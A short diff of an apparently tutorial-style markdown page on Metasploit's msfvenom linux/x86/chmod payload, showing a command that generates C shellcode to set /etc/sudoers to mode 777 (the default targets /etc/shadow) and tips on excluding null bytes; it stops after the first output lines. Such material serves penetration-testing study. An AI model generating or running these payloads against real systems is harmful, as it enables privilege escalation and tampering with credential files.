@@ -41,9 +41,13 @@ MODE  0666             yes       File mode (octal)
 Description:
   Runs chmod on specified file with specified mode
 [...]
+```
+
 The current setting for this payload is /etc/shadow for the FILE and 666 as the MODE. 
 The following command generates a shell-code with the value /etc/sudoers as the FILE value and 777 as the mode in c formatting.
 Note that the shell-code contains zeros, you can exclude them by specifying \x00 as a bad character with -b '\x00'
+
+```
 dipsy@kali:~$ msfvenom -p linux/x86/chmod FILE=/etc/sudoers MODE=777 -f c 
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 [-] No arch selected, selecting arch: x86 from the payload
